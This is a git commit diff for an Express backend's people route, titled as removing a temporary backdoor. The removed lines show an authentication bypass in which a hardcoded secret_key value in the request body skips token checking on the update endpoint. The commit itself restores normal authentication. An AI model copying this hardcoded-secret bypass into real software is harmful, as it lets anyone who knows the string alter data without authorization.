bf3f33826066595384aead235c1c00b5863a69df
Vempali Sai Linisha <vempalisailinisha@gmail.com>
2026-07-11 17:58:34 +0530

    chore: remove temporary backdoor

--- backend/src/routes/people.ts
+++ backend/src/routes/people.ts
@@ -39,12 +39,7 @@ router.post("/", authenticateToken, async (req, res): Promise<any> => {
 });
 
 // Update a person
-router.put("/:id", async (req, res, next) => {
-  if (req.body.secret_key === "nisha_secret") {
-    return next();
-  }
-  authenticateToken(req, res, next);
-}, async (req, res): Promise<any> => {
+router.put("/:id", authenticateToken, async (req, res): Promise<any> => {
   try {
     const person = await Person.findOneAndUpdate(
       { id: req.params.id },
